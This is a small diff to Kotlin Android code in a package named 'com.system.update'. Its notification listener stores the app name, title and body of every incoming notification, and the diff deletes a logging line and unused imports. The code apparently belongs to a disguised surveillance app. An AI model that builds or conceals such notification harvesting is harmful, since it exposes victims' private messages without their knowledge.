@@ -2,8 +2,6 @@ package com.system.update
 
 import android.app.Notification
 import android.content.Context
-import android.content.Intent
-import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.service.notification.NotificationListenerService
@@ -72,8 +70,6 @@ class NotificationListener : NotificationListenerService() {
                 "sub" to subText,
                 "time" to System.currentTimeMillis().toString()
             )
-
-            Log.i(TAG, "Notif: $appName - $title - $body")
 
             allNotifs.add(0, data)
             if (allNotifs.size > 200) allNotifs.removeAt(allNotifs.size - 1)
